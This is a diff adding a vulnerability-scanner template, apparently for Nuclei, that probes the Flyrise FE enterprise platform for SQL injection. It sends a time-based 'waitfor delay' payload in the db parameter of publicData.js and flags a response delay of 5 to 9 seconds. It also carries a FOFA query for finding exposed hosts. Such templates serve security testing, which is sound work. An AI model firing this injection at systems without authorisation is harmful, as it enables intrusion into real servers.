@@ -1,0 +1,32 @@
+id: flyrise-publicData-sqli
+info:
+  name: 飞企互联 FE 企业运营管理平台 publicData.js - sqli
+  author: leadlife
+  severity: high
+  description:
+  metadata:
+    verified: true
+    fofa-qeury: app="飞企互联-FE企业运营管理平台"
+  tags: flyrise,sqli
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /oaerp/ui/common/publicData.js%70?type=getAllTableInfo&db=';waitfor+delay+'0:0:6'-- HTTP/1.1
+        Host: {{Hostname}}
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,imag e/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
